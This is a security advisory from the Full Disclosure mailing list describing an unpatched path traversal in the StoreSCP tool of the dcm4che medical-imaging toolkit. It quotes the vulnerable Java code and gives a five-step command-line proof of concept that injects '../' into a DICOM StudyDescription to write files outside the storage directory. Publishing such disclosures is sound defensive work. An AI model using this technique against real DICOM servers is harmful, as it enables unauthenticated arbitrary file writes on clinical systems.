---
title: [SYSS-2026-077]: dcm4che - Path Traversal (CWE-22)
url: https://seclists.org/fulldisclosure/2026/Oct/22
source: Full Disclosure
date: 2026-10-15
fetch_date: 2026-10-16T06:37:50.336820
---

# [SYSS-2026-077]: dcm4che - Path Traversal (CWE-22)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-077]: dcm4che - Path Traversal (CWE-22)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 15 Oct 2026 09:32:00 +0200

---

```
Advisory ID:               SYSS-2026-077
Product:                   dcm4che
Manufacturer:              J4Care
Affected Version(s):       5.35.0
Tested Version(s):         5.35.0
```

Vulnerability Type: Improper Limitation of a Pathname to a
Restricted Directory ('Path Traversal') (CWE-22)

```
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-08-06
Public Disclosure:         2026-10-13
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:
```

dcm4che is a Java-based Digital Imaging and Communications in Medicine
(DICOM)
toolkit providing libraries and command-line utilities for processing,
storing,

```
and transmitting DICOM data (see [1]).

The StoreSCP command-line tool in dcm4che is vulnerable to a path traversal
attack. An attacker who can send DICOM C-STORE requests to a vulnerable
StoreSCP server can write arbitrary files outside the configured storage
directory by injecting "../" sequences into DICOM attribute values.

This allows unauthenticated remote attackers to achieve arbitrary file write
on the target system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The StoreSCP tool receives DICOM files over the DICOM network protocol via
C-STORE requests. When a file is received, it is temporarily written to
the configured storage directory and then renamed to its final destination
using an AttributesFormat pattern (see StoreSCP.java:121-124):

  String iuid = rq.getString(Tag.AffectedSOPInstanceUID);
  File file = File.createTempFile(iuid, PART_EXT, storageDir);
  try {
      storeTo(as, as.createFileMetaInformation(iuid, cuid, tsuid),
              data, file);
      renameTo(as, file, new File(storageDir,
              filePathFormat == null
                      ? iuid
                      : filePathFormat.format(parse(file))));

The filePathFormat is constructed from a command-line argument (--filepath)
and substitutes DICOM attribute values into the filename pattern. The
AttributesFormat.format() method extracts values from network-received DICOM
attributes and inserts them directly into the resulting path.

The renameTo() method (StoreSCP.java:168-186) then creates any required
parent directories and moves the file without validating that the resolved
path remains within the configured storage directory:

  private void renameTo(Association as, File from, File dest)
          throws IOException {
      LOG.info("{}: M-RENAME {} to {}", as, from, dest);
      for(int try_count = 0; try_count <= renameRetries; try_count++) {
          try{
              dest.getParentFile().mkdirs();
              Files.move(from.toPath(), dest.toPath(),
                              StandardCopyOption.REPLACE_EXISTING);
              return;

No path normalization, canonicalization, or boundary check is performed. If
the --filepath pattern references any DICOM attribute that the remote DICOM
client controls (such as StudyDescription {0008,1030}, StudyInstanceUID
{0020,000D}, or SeriesDescription {0008,103E}), the client can include
"../" sequences that escape the storage directory.
```

For example, with --filepath "{00081030}" (StudyDescription), a
StudyDescription

```
value of "../outside_storage" causes the destination path to resolve to:

  new File(storageDir, "../outside_storage")

which is the parent directory of storageDir. The mkdirs() call creates the
traversal path, and Files.move() writes the DICOM file to the escaped
location. Because DICOM C-STORE carries no authentication, this attack can
be executed from any network location with access to the StoreSCP port.

The root cause is the missing validation after AttributesFormat.format()
before the resulting path is used in file operations.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The path traversal can be demonstrated using the dcm4che CLI utilities
using the following steps.

Step 1:
Create a malicious DICOM file with path traversal in StudyDescription

dcm2xml test.dcm > base.xml

Step 2:
Inject <DicomAttribute keyword="StudyDescription" tag="00081030" vr="LO">
       <Value number="1">../outside_storage</Value></DicomAttribute>

xml2dcm -x base.xml -o malicious.dcm

Step 3:
Start storescp with the StudyDescription as filepath pattern

storescp -b STORESCP@127.0.0.1:11121 \
    --filepath "{00081030}" \
    --directory /tmp/storage &

Step 4:
Send the malicious DICOM file

storescu -c STORESCP@127.0.0.1:11121 malicious.dcm

Step 5:
Verify the file escaped the storage directory

ls /tmp/outside_storage       # File exists outside /tmp/storage
```

ls /tmp/storage/ # Empty, file did not land in storage
directory

```
The file is written to /tmp/outside_storage, one directory level above the
configured storage directory, confirming the path traversal.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-08-06: Vulnerability reported to manufacturer
2026-09-04: Vulnerability reported to manufacturer again
2026-10-13: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] dcm4che project website
    https://www.dcm4che.org/
[2] SySS Security Advisory SYSS-2026-077
```

<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-077.txt>

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc>

```
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS
website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 4.0
URL: https://creativecommons.org/licenses/by/4.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-22/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclos...